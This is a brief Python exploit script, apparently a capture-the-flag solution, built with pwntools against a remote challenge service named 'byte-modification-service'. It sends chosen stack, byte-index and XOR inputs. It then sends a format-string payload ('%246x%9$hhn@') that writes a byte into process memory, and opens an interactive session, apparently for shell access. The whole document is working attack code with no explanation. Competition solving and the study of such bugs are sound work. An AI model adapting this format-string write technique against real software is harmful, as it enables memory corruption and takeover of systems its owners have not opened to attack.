from pwn import *

bin = './chall'
elf = context.binary = ELF(bin)

#p = process(bin)
#gdb.attach(p, 'b *vuln+318')

p = remote('byte-modification-service.challs.csc.tf', 1337)
p.sendlineafter(b'which stack position do you want to use?', b'7')
p.sendlineafter(b'Byte Index?', b'0')
p.sendlineafter(b'xor with?', b'97')
p.sendlineafter(b'feedback?', b'%246x%9$hhn@')

p.interactive()